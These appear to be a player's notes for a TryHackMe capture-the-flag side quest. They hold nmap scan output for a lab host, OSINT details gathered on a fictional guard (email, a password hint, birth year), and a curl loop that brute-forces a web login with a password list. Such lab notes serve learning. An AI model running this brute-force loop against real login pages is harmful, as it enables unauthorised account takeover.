# Side Quest 1 (Day 1)

* Nmap scanning:
```sh
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-26 19:10 +01
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 69.63% done; ETC: 19:10 (0:00:03 remaining)
Nmap scan report for 10.67.168.213
Host is up (0.22s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
|_banner: SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.11
80/tcp   open  http
8000/tcp open  http-alt
8080/tcp open  http-proxy
9001/tcp open  tor-orport
| banner: \xE2\x95\x94\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE
|_2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x9...

Nmap done: 1 IP address (1 host up) scanned in 36.63 seconds
```

* Info

email: guard.hopkins@hopsecasylum.com
Can I just say.....I LOVE PIZZA
Johnnyboy
bruteforcing challenges on thm: /opt/hashcat-utils/src/combinator.bin on the AttackBox!
Did you know that if you enter your password as a comment on a post, it appears as *'s?
> Pizza1234$  (changed)
birth date: 1982


* bruteforce script:
```sh
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=guard.hopkins@hopsecasylum.com&password=$pass" http://10.67.168.213:8080/cgi-bin/login.sh)
  #if echo "$response" | grep -q "Welcome"; then
  #  echo "[+] Password found: $pass"
  #  break
  #fi
  echo "$response"
done
```